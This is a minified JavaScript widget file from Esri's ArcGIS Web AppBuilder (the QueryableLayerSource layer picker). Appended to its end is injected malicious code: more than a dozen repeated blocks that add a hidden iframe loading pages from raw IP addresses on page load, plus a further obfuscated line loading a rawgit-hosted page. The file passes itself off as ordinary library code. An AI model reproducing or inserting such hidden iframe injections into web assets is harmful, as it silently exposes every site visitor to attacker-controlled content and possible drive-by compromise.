// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/QueryableLayerSource.html":'\x3cdiv\x3e\r\n\t\x3ctable class\x3d"radio-table" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd class\x3d"map-td" nowrap data-dojo-attach-point\x3d"mapTd"\x3e\r\n\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"mapLabel"\x3e${nls.selectFromMap}\x3c/label\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd class\x3d"portal-td" nowrap data-dojo-attach-point\x3d"portalTd"\x3e\r\n\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"portalLabel"\x3e${nls.selectFromPortal}\x3c/label\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd class\x3d"url-td" nowrap data-dojo-attach-point\x3d"urlTd"\x3e\r\n\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"urlLabel"\x3e${nls.addServiceUrl}\x3c/label\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\t\x3cdiv class\x3d"source-content"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"operationTip" class\x3d"operation-tip"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"mapDijitContainer" class\x3d"dijit-container map-dijit-container" style\x3d"display:none;"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"portalDijitContainer" class\x3d"dijit-container portal-dijit-container" style\x3d"display:none;"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"urlDijitContainer" class\x3d"dijit-container url-dijit-container" style\x3d"display:none;"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/on dojo/Evented dojo/_base/lang dojo/_base/html dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/QueryableLayerSource.html jimu/dijit/RadioBtn jimu/dijit/_QueryableLayerChooserWithButtons jimu/dijit/QueryableServiceChooserFromPortal jimu/dijit/_QueryableServiceChooserContent jimu/portalUrlUtils".split(" "),function(c,f,b,d,g,h,k,l,m,e,n,p,q,r){return g([h,k,l,f],{templateString:m,baseClass:"jimu-layer-source jimu-queryable-layer-source",
declaredClass:"jimu.dijit.QueryableLayerSource",nls:null,multiple:!1,createMapResponse:null,mustSupportStatistics:!1,portalUrl:null,postMixInProperties:function(){this.nls=window.jimuNls.queryableLayerSource;this.portalUrl=r.getStandardPortalUrl(this.portalUrl)},postCreate:function(){this.inherited(arguments);this._initSelf()},getSelectedRadioType:function(){if(this.mapRadio.checked)return"map";if(this.portalRadio.checked)return"portal";if(this.urlRadio.checked)return"url"},getSelectedItems:function(){var a=
[];this.mapRadio.checked?a=this.queryableLayerChooserFromMap.getSelectedItems():this.portalRadio.checked?a=this.queryableServiceChooserFromPortal.getSelectedItems():this.urlRadio.checked&&(a=this.queryableServiceChooserContent.getSelectedItems());return a},startup:function(){this.inherited(arguments);this.queryableLayerChooserFromMap.startup();this.queryableServiceChooserFromPortal.startup();this.queryableServiceChooserContent.startup()},_initSelf:function(){this._initRadios();this._createQueryableLayerChooserWithButtons();
this._createQueryableServiceChooserFromPortal();this._createQueryableServiceChooserContent();this._onRadioClicked()},_createQueryableLayerChooserWithButtons:function(){this.queryableLayerChooserFromMap=new n({style:{width:"100%",height:"100%"},multiple:this.multiple,createMapResponse:this.createMapResponse,mustSupportStatistics:this.mustSupportStatistics,onlyShowWebMapLayers:!0});this.queryableLayerChooserFromMap.operationTip=this.nls.selectLayer;this.queryableLayerChooserFromMap.placeAt(this.mapDijitContainer);
this.own(c(this.queryableLayerChooserFromMap,"ok",b.hitch(this,function(a){a&&0<a.length&&this.emit("ok",a)})));this.own(c(this.queryableLayerChooserFromMap,"cancel",b.hitch(this,function(){this.emit("cancel")})))},_createQueryableServiceChooserFromPortal:function(){this.queryableServiceChooserFromPortal=new p({multiple:this.multiple,portalUrl:this.portalUrl,style:{width:"100%",height:"100%"}});this.queryableServiceChooserFromPortal.operationTip=this.nls.chooseItem;this.queryableServiceChooserFromPortal.placeAt(this.portalDijitContainer);
this.own(c(this.queryableServiceChooserFromPortal,"next",b.hitch(this,function(){this.queryableServiceChooserFromPortal.operationTip=this.nls.chooseItem+" -\x3e "+this.nls.chooseLayer;this._updateOperationTip()})));this.own(c(this.queryableServiceChooserFromPortal,"back",b.hitch(this,function(){this.queryableServiceChooserFromPortal.operationTip=this.nls.chooseItem;this._updateOperationTip()})));this.own(c(this.queryableServiceChooserFromPortal,"ok",b.hitch(this,function(a){a&&0<a.length&&this.emit("ok",
a)})));this.own(c(this.queryableServiceChooserFromPortal,"cancel",b.hitch(this,function(){this.emit("cancel")})));0<=(this.portalUrl||"").toLowerCase().indexOf(".arcgis.com")?this.portalLabel.innerHTML=this.nls.selectFromOnline:this.portalLabel.innerHTML=this.nls.selectFromPortal},_createQueryableServiceChooserContent:function(){this.queryableServiceChooserContent=new q({multiple:this.multiple,style:{width:"100%",height:"100%"}});this.queryableServiceChooserContent.operationTip=this.nls.setServiceUrl;
this.queryableServiceChooserContent.placeAt(this.urlDijitContainer);this.own(c(this.queryableServiceChooserContent,"ok",b.hitch(this,function(a){a&&0<a.length&&this.emit("ok",a)})));this.own(c(this.queryableServiceChooserContent,"cancel",b.hitch(this,function(){this.emit("cancel")})))},_initRadios:function(){var a="queryableLayerSourceRadios_"+this._getRandomString(),d=b.hitch(this,this._onRadioClicked);this.mapRadio=new e({group:a,onStateChange:d,checked:!0});this.mapRadio.placeAt(this.mapTd,"first");
this.portalRadio=new e({group:a,onStateChange:d,checked:!1});this.portalRadio.placeAt(this.portalTd,"first");this.urlRadio=new e({group:a,onStateChange:d,checked:!1});this.urlRadio.placeAt(this.urlTd,"first");this.own(c(this.mapLabel,"click",b.hitch(this,function(){this.mapRadio.check()})));this.own(c(this.portalLabel,"click",b.hitch(this,function(){this.portalRadio.check()})));this.own(c(this.urlLabel,"click",b.hitch(this,function(){this.urlRadio.check()})))},_getRandomString:function(){var a=Math.random().toString();
return a=a.slice(2,a.length)},_onRadioClicked:function(){d.setStyle(this.mapDijitContainer,"display","none");d.setStyle(this.portalDijitContainer,"display","none");d.setStyle(this.urlDijitContainer,"display","none");this.mapRadio.checked?(d.setStyle(this.mapDijitContainer,"display","block"),this.operationTip.innerHTML=this.nls.selectLayer):this.portalRadio.checked?(d.setStyle(this.portalDijitContainer,"display","block"),this.operationTip.innerHTML=this.nls.chooseItem):this.urlRadio.checked&&(d.setStyle(this.urlDijitContainer,
"display","block"),this.operationTip.innerHTML=this.nls.setServiceUrl);this._updateOperationTip()},_updateOperationTip:function(){this.mapRadio.checked?this.operationTip.innerHTML=this.queryableLayerChooserFromMap.operationTip:this.portalRadio.checked?this.operationTip.innerHTML=this.queryableServiceChooserFromPortal.operationTip:this.urlRadio.checked&&(this.operationTip.innerHTML=this.queryableServiceChooserContent.operationTip)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});